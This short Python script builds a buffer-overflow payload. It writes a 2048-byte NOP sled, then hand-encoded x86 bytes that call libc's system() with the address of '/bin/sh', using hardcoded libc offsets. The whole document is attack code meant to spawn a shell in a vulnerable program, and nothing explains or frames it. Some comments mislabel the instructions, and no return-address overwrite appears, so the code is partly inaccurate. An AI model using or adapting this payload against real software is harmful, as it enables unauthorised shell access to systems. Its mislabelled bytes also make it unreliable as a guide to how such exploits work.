import struct

libc_base_adr = 0xf7e2c000
system_adr = libc_base_adr + 0x3eed0
bin_sh_adr = libc_base_adr + 0x15d7ec

# Create the payload
payload = b"\x90" * 2048  # Fill up the buffer with NOPs
payload += b"\xc7\x04\x24"  # mov_dword
payload += struct.pack("<I", bin_sh_adr)
payload += b"\xb8"          # push address on eax
payload += struct.pack("<I", system_adr)  # current address for relative call
payload += b"\xff\xd0"      # call eax

print(payload)
